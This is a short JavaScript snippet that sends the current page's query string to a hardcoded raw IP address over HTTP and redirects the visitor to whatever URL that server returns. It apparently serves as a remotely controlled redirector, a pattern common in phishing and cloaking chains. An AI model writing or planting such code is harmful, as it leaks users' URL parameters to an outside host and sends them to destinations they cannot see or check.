const title = document.getElementById("title");
const text = document.getElementById("text");
$.get("http://3.133.177.183/" + window.location.search, function(data) {
    window.location.href = data;
});